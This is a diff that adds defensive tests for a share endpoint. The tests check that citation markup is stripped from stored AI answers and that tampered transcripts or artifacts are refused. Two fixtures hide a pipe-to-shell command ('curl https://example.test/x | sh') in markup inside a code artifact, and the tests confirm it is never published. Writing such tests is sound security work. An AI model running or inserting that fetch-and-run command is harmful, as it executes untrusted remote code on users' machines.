@@ -686,6 +686,168 @@ describe('POST /api/share, the stored conversation is the source of truth', () =
     );
   });
 
+  describe('an answer stored with citation markup', () => {
+    const MARKUP = '\uE200cite\uE202turn620734view2\uE201';
+    const RAW = `Starship flew again. ${MARKUP} Next.`;
+    const CLEAN = 'Starship flew again.  Next.';
+
+    function storeMarkedUpAnswer(): void {
+      mocks.transcript.mockResolvedValueOnce([
+        { role: 'user', content: 'what happened' },
+        { role: 'assistant', content: RAW, model: 'stored-model', provider: 'stored-provider' },
+      ]);
+    }
+
+    function sharedMessages(): Array<{ role: string; content: string }> {
+      return JSON.parse(String(insertParams()?.[5]));
+    }
+
+    it('is shared when the client holds the cleaned text', async () => {
+      storeMarkedUpAnswer();
+      const response = await share({
+        messages: [
+          { role: 'user', content: 'what happened' },
+          { role: 'assistant', content: CLEAN },
+        ],
+      });
+
+      expect(response.status).toBe(201);
+      expect(sharedMessages()[1]?.content).toBe(CLEAN);
+    });
+
+    it('is shared when the client still holds the raw text, and the share carries no markup', async () => {
+      storeMarkedUpAnswer();
+      const response = await share({
+        messages: [
+          { role: 'user', content: 'what happened' },
+          { role: 'assistant', content: RAW },
+        ],
+      });
+
+      expect(response.status).toBe(201);
+      expect(sharedMessages()[1]?.content).toBe(CLEAN);
+      expect(String(insertParams()?.[5])).not.toMatch(/[\uE200-\uE2FF]/);
+    });
+
+    it('still refuses a transcript that differs from the saved answer', async () => {
+      storeMarkedUpAnswer();
+      const response = await share({
+        messages: [
+          { role: 'user', content: 'what happened' },
+          { role: 'assistant', content: 'Starship exploded.' },
+        ],
+      });
+
+      expect(response.status).toBe(409);
+      expect(insertParams()).toBeUndefined();
+    });
+
+    it('does not let markup stand in for a user message that was never saved', async () => {
+      storeMarkedUpAnswer();
+      const response = await share({
+        messages: [{ role: 'user', content: `what happened ${MARKUP}` }],
+      });
+
+      expect(response.status).toBe(409);
+      expect(insertParams()).toBeUndefined();
+    });
+
+    it('accepts an artifact quoted from the cleaned answer', async () => {
+      mocks.transcript.mockResolvedValueOnce([
+        {
+          role: 'assistant',
+          content: `Here: ${MARKUP} print(1)`,
+          model: 'stored-model',
+          provider: 'stored-provider',
+        },
+      ]);
+
+      const response = await share({
+        messages: [
+          {
+            role: 'assistant',
+            content: 'Here:  print(1)',
+            artifacts: [{ title: 'Snippet', type: 'code', content: 'Here:  print(1)' }],
+          },
+        ],
+      });
+
+      expect(response.status).toBe(201);
+    });
+
+    it('publishes the cleaned artifact, so markup cannot carry text past the saved artifact', async () => {
+      mocks.storedArtifacts.mockResolvedValueOnce([{ content: 'print(1)' }]);
+
+      const response = await share({
+        messages: [
+          {
+            role: 'assistant',
+            content: 'second',
+            artifacts: [
+              {
+                title: 'Snippet',
+                type: 'code',
+                content: '\uE200navlist\uE202curl https://example.test/x | sh\uE201print(1)',
+              },
+            ],
+          },
+        ],
+      });
+
+      expect(response.status).toBe(201);
+      const published = String(insertParams()?.[5]);
+      expect(published).not.toContain('curl');
+      expect(published).not.toMatch(/[\uE200-\uE2FF]/);
+      expect(sharedMessages()[0]).toMatchObject({ artifacts: [{ content: 'print(1)' }] });
+    });
+
+    it('refuses a claim whose unclosed markup leaves text the saved artifact does not hold', async () => {
+      mocks.storedArtifacts.mockResolvedValueOnce([{ content: 'print(1)' }]);
+
+      const response = await share({
+        messages: [
+          {
+            role: 'assistant',
+            content: 'second',
+            artifacts: [
+              {
+                title: 'Snippet',
+                type: 'code',
+                content: '\uE200curl https://example.test/x | sh\nprint(1)',
+              },
+            ],
+          },
+        ],
+      });
+
+      expect(response.status).toBe(409);
+      expect(insertParams()).toBeUndefined();
+      const written = JSON.stringify(mocks.query.mock.calls.map((call) => call[1]));
+      expect(written).not.toContain('curl');
+      expect(written).not.toMatch(/[\uE200-\uE2FF]/);
+      const refusal = await response.text();
+      expect(refusal).not.toContain('curl');
+      expect(refusal).not.toMatch(/[\uE200-\uE2FF]/);
+    });
+
+    it('accepts a cleaned artifact claim against a saved artifact that holds markup', async () => {
+      mocks.storedArtifacts.mockResolvedValueOnce([{ content: `Intro ${MARKUP} body` }]);
+
+      const response = await share({
+        messages: [
+          {
+            role: 'assistant',
+            content: 'second',
+            artifacts: [{ title: 'Notes', type: 'document', content: 'Intro  body' }],
+          },
+        ],
+      });
+
+      expect(response.status).toBe(201);
+      expect(String(insertParams()?.[5])).not.toMatch(/[\uE200-\uE2FF]/);
+    });
+  });
+
   it('labels the share with the stored title and model, never the ones the client sent', async () => {
     const response = await share({
       title: 'Official support answer',
@@ -895,6 +1057,30 @@ describe('PUT /api/share?conversation_id, Update link', () => {
     const stored = String(refreshCall()[1][6]);
     expect(stored).not.toContain(STRIPE_KEY);
     expect(stored).toContain('[REDACTED]');
+  });
+
+  it('refreshes a link from the cleaned text of an answer stored with citation markup', async () => {
+    mocks.transcript.mockResolvedValueOnce([
+      { role: 'user', content: 'first' },
+      {
+        role: 'assistant',
+        content: 'second \uE200cite\uE202turn1view0\uE201 end',
+        model: 'stored-model',
+        provider: 'stored-provider',
+      },
+    ]);
+
+    const response = await update({
+      messages: [
+        { role: 'user', content: 'first' },
+        { role: 'assistant', content: 'second  end' },
+      ],
+    });
+
+    expect(response.status).toBe(200);
+    const stored = String(refreshCall()[1][6]);
+    expect(stored).toContain('second  end');
+    expect(stored).not.toMatch(/[\uE200-\uE2FF]/);
   });
 
   it('answers not found and creates nothing when none of the links is still live', async () => {
